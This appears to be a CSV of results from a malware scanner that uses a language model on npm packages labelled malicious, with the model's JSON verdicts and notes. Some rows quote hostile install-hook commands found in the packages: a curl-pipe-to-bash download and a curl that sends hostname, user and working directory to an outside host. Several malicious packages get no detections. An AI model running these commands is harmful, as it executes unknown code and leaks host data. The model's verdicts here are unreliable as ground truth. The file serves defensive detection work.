package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
cage-js,0.0.4,malicious,2026-03-26T22:07:40.832557,flag,1.0,True,1,remote_code_execution,0.8,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""remote_code_execution"",
      ""summary"": ""The package contains a post-install hook that downloads and executes a remote script using curl and bash."",
      ""details"": ""The post-install hook in the package.json scripts section contains the commands: curl https://files.gangelov.net/cage.sh2 >/dev/null|bash&>/dev/null. This command downloads a script from a remote URL and executes it using bash."",
      ""confidence"": 0.8,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [""https://files.gangelov.net""],
      ""evidence_commands"": [""curl"", ""bash""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""remote_code_execution""]
}
```

This analysis confirms the primary signal of remote code execution. The package contains a post-install hook that downloads and executes a remote script using curl and bash, which is a common technique for delivering malicious payloads. The confidence score is 0.8, indicating a high level of confidence in the detection.","{""behaviors"": [{""category"": ""remote_code_execution"", ""summary"": ""The package contains a post-install hook that downloads and executes a remote script using curl and bash."", ""details"": ""The post-install hook in the package.json scripts section contains the commands: curl https://files.gangelov.net/cage.sh2 >/dev/null|bash&>/dev/null. This command downloads a script from a remote URL and executes it using bash."", ""confidence"": 0.8, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""https://files.gangelov.net""], ""evidence_commands"": [""curl"", ""bash""], ""evidence_env_vars"": []}], ""risk_vector"": [""remote_code_execution""]}","This analysis confirms the primary signal of remote code execution. The package contains a post-install hook that downloads and executes a remote script using curl and bash, which is a common technique for delivering malicious payloads. The confidence score is 0.8, indicating a high level of confidence in the detection."
cal_rd,0.1.1,malicious,2026-03-26T22:07:42.139811,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
cameo-react-native-share-story,2.9.0,malicious,2026-03-26T22:07:44.403231,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
cameo-react-native-share-story,2.9.1,malicious,2026-03-26T22:07:45.904220,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
chalc,2.0.0,malicious,2026-03-26T22:07:52.602681,flag,0.77,True,1,supply_chain_propagation,0.82,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[{""category"":""supply_chain_propagation"",""summary"":""The package name closely resembles popular package 'chalk'"",""details"":""The package name 'chalc' closely resembles popular package 'chalk'"",""confidence"":0.82,""evidence_apis"":[],""evidence_files"":[""package.json""],""evidence_domains"":[],""evidence_commands"":[],""evidence_env_vars"":[]}],""risk_vector"":[""supply_chain_propagation""]}```


The package name 'chalc' closely resembles popular package 'chalk'. The confidence score is 0.82, indicating high confidence that this package is part of a supply chain attack. The evidence file is 'package.json', indicating that this behavior is likely related to the package.json file.","{""behaviors"": [{""category"": ""supply_chain_propagation"", ""summary"": ""The package name closely resembles popular package 'chalk'"", ""details"": ""The package name 'chalc' closely resembles popular package 'chalk'"", ""confidence"": 0.82, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""supply_chain_propagation""]}","The package name 'chalc' closely resembles popular package 'chalk'. The confidence score is 0.82, indicating high confidence that this package is part of a supply chain attack. The evidence file is 'package.json', indicating that this behavior is likely related to the package.json file."
chalk2,2.4.0,malicious,2026-03-26T22:08:01.309378,review,0.3873,True,1,suspicious_behavior,0.39,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""Package closely resembles popular package 'chalk'"",
      ""details"": ""The package name closely resembles the popular package 'chalk' which is a popular package for styling text in the terminal."",
      ""confidence"": 0.39,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""suspicious_behavior""]
}
```

This JSON output indicates that the package name closely resembles the popular package 'chalk', which is a popular package for styling text in the terminal. The confidence score is 0.39, indicating a low level of confidence in the detection. The evidence for this behavior is not provided in the code snippet provided.","{""behaviors"": [{""category"": ""suspicious_behavior"", ""summary"": ""Package closely resembles popular package 'chalk'"", ""details"": ""The package name closely resembles the popular package 'chalk' which is a popular package for styling text in the terminal."", ""confidence"": 0.39, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""suspicious_behavior""]}","This JSON output indicates that the package name closely resembles the popular package 'chalk', which is a popular package for styling text in the terminal. The confidence score is 0.39, indicating a low level of confidence in the detection. The evidence for this behavior is not provided in the code snippet provided."
chameleonbasic,1.0.4-test.1,malicious,2026-03-26T22:08:02.902332,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
changelog-tool,1.1.0,malicious,2026-03-26T22:08:12.811914,review,0.336,True,1,install_hook,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains no JavaScript files but an install hook present. Payload may be remote."",
      ""details"": ""The package file structure contains an install hook present. This is likely an attack payload that executes at install time via the commands listed in the PACKAGEMETADATA above."",
      ""confidence"": 0.72,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [
        ""curl -H\""Package:changelog-tool\"" -H\""Version:1.1.0\"" -H\""Hostname:$(hostname|base64)\"" -H\""Whoami:$(whoami|base64)\"" -H\""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains no JavaScript files but an install hook present. Payload may be remote."", ""details"": ""The package file structure contains an install hook present. This is likely an attack payload that executes at install time via the commands listed in the PACKAGEMETADATA above."", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl -H\""Package:changelog-tool\"" -H\""Version:1.1.0\"" -H\""Hostname:$(hostname|base64)\"" -H\""Whoami:$(whoami|base64)\"" -H\""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}",
changelog-tool,1.1.1,malicious,2026-03-26T22:08:23.207819,review,0.336,True,1,install_hook,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains no JavaScript files but an install hook present. Payload may be remote."",
      ""details"": ""The package file structure contains an install hook present. This is likely an attack payload that executes at install time via the commands listed in the PACKAGEMETADATA above."",
      ""confidence"": 0.72,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [
        ""curl -H\""Package:changelog-tool\"" -H\""Version:1.1.1\"" -H\""Hostname:$(hostname|base64)\"" -H\""Whoami:$(whoami|base64)\"" -H\""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm-new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""
      ],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook""]
}
```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains no JavaScript files but an install hook present. Payload may be remote."", ""details"": ""The package file structure contains an install hook present. This is likely an attack payload that executes at install time via the commands listed in the PACKAGEMETADATA above."", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl -H\""Package:changelog-tool\"" -H\""Version:1.1.1\"" -H\""Hostname:$(hostname|base64)\"" -H\""Whoami:$(whoami|base64)\"" -H\""Pwd:$(pwd|base64)\"" -d\""meow!securitytest\"" http://npm-new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook""]}",
charset-normalizer,10.10.1,malicious,2026-03-26T22:08:36.669715,flag,1.0,True,1,data_exfiltration,0.79,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""data_exfiltration"",
      ""summary"": ""The code sends network requests to a specified hostname."",
      ""details"": ""The code sends network requests to a hostname 'cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun' in the index.js file at line 25 and 4. The request method is POST and the content type is 'application/x-www-form-urlencoded'. The data sent in the request is a JSON string of package information."",
      ""confidence"": 0.79,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [""index.js""],
      ""evidence_domains"": [""cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""data_exfiltration""]
}
```

This analysis indicates that the package is likely to have malicious intent. The code sends network requests to a specified host, which could be used for data exfiltration. The confidence score is 0.79, indicating a high level of confidence in the detection. The evidence for this behavior comes from the use of the 'https.request' API, the 'index.js' file, and the domain 'cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun'.","{""behaviors"": [{""category"": ""data_exfiltration"", ""summary"": ""The code sends network requests to a specified hostname."", ""details"": ""The code sends network requests to a hostname 'cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun' in the index.js file at line 25 and 4. The request method is POST and the content type is 'application/x-www-form-urlencoded'. The data sent in the request is a JSON string of package information."", ""confidence"": 0.79, ""evidence_apis"": [""https.request""], ""evidence_files"": [""index.js""], ""evidence_domains"": [""cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""data_exfiltration""]}","that the package is likely to have malicious intent. The code sends network requests to a specified host, which could be used for data exfiltration. The confidence score is 0.79, indicating a high level of confidence in the detection. The evidence for this behavior comes from the use of the 'https.request' API, the 'index.js' file, and the domain 'cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun'."
